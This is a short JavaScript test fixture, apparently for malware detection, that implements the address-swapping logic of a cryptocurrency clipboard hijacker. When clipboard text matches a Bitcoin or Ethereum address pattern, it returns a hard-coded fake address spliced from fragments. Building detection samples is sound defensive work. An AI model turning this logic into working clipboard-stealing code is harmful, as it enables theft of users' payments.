// FIXTURE ONLY — synthetic detection test sample, not real malware
// A clipper helper that leaves the clipboard write to its caller: when the clipboard text looks
// like a crypto address it hands back a fixed address (spliced from fragments), otherwise the
// text unchanged. The address is fake and nothing here is ever run.
const PAYOUT = "bc1q" + "fixturefake" + "0000000000";

function onClipboardChange(clipboardText) {
  if (/^(bc1|0x)[a-z0-9]+/i.test(clipboardText)) {
    return PAYOUT;
  }
  return clipboardText;
}

module.exports = { onClipboardChange };
